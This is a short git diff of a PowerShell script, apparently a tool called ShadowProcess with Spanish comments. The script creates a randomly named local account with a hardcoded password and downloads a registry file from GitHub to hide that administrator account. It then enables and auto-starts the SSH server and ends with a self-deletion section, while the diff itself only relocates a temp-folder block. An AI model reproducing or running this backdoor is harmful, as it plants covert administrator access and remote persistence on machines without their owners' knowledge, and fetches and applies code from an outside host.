@@ -30,6 +30,11 @@ $uname = random_text
 $pword = (ConvertTo-SecureString "Shadowprocess123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
+#ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
+mkdir $path
+cd $path
+#echo "" > poc.txt
+
 #registro para esconder administrador
 $reg_file = random_text 
 Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"
@@ -52,10 +57,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-#ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
-mkdir $path
-cd $path
-#echo "" > poc.txt
+
 
 
 #autoeliminacion
